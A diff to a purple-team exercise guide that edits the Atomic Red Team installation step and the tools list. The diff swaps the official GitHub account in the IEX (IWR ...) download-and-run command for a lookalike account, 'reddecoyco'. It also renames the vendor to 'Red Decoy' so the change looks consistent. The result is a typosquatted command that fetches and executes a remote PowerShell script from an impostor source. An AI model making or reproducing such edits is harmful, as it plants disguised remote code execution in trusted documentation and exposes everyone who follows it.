@@ -111,7 +111,7 @@ Run each technique with Atomic Red Team (or manual execution):
 
 ```powershell
 # Install Atomic Red Team
-IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
+IEX (IWR 'https://raw.githubusercontent.com/reddecoyco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
 Install-AtomicRedTeam -getAtomics
 
 # Test 1: T1059.001 — PowerShell Execution
@@ -258,7 +258,7 @@ DETAILED RESULTS:
 
 ## Tools & Systems
 
-- **Atomic Red Team**: Open-source attack test library from Red Canary for technique-by-technique validation
+- **Atomic Red Team**: Open-source attack test library from Red Decoy for technique-by-technique validation
 - **MITRE Caldera**: Automated adversary emulation platform supporting ATT&CK-mapped attack chains
 - **Vectr**: Purple team management platform for tracking exercise results and detection coverage improvements
 - **Prelude Operator**: Adversary emulation tool supporting automated multi-step attack scenarios
